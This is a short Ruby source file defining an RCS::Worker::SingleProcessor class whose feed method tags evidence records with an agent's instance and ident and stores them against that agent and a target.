require 'rcs-common/trace'

module RCS
module Worker

class SingleProcessor
  include RCS::Tracer
  require 'pp'

  def initialize(agent, target)
    @agent = agent
    @target = target
    @calls = []
  end

  def feed(evidence)
    # store agent instance in evidence (used when storing into db)
    evidence[:instance] = @agent['instance']
    evidence[:ident] = @agent['ident']

    ev = evidence.store @agent, @target
    yield ev if block_given?
    return ev._id, 1
  end
end

end # Worker
end # RCS